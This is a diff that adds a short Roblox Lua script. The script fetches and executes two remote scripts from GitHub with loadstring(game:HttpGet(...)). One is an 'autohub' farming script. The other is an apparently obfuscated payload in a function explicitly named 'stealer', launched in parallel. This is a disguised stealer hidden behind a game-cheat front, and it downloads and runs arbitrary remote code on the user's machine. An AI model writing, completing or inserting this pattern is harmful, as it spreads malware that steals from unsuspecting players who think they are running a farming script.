@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/vertezxmm2/woverdrive/refs/heads/main/Protected_5307798382824908.txt'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/vertezxmm2/woverdrive/refs/heads/main/autohub.txt'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
